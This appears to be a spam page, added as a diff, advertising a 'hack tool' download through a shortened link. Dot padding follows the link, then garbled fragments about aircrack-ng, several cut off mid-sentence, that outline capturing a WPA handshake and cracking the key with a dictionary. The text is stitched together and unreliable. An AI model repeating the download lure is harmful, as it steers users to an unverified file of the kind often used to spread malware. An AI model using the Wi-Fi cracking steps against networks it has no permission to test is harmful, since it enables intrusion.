@@ -1,0 +1,57 @@
+  Wifi hacking aircrack-ng
+  
+  
+  
+  𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐇𝐀𝐂𝐊 𝐓𝐎𝐎𝐋 𝐇𝐄𝐑𝐄 ===> https://tinyurl.com/y3fwxy37?523623
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  
+  
+  .
+  
+  Aircrack-ng is a set of tools in Kali Linux that can be used to assess Wi-Fi network security. It is capable of monitoring (capturing. Aircrack-ng is a Wi-Fi security auditing tool specifically WEP and WPA/WPA2-PSK. It is also used for cracking the WEP and WPA/WPA2-PSK keys for. Solution · Step 1 - Start the wireless interface in monitor mode · Step 2 - Start airodump-ng to collect authentication handshake · Step 3 - Use.
+  
+   · 1. Download and extract aircrack-ng 2. Go to the ‘bin‘ folder and open aircrack-ng Gui 3. Choose capture file (4way handshake cap file) 4. Here we are trying to find out the WPA password. So select WPA 5. Now select the dictionary file. It . Aircrack- ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: Monitoring: Packet capture and export of data to text files for further processing by third party tools. Attacking: Replay attacks, deauthentication, fake access points and others via packet injection.  · Run aircrack-ng to crack the pre-shared key using the authentication handshake. Step 1 - Start the wireless interface in monitor mode. The purpose of this step is to put your card into what is called monitor mode. Monitor mode is the mode whereby your card can listen to every packet in the air.
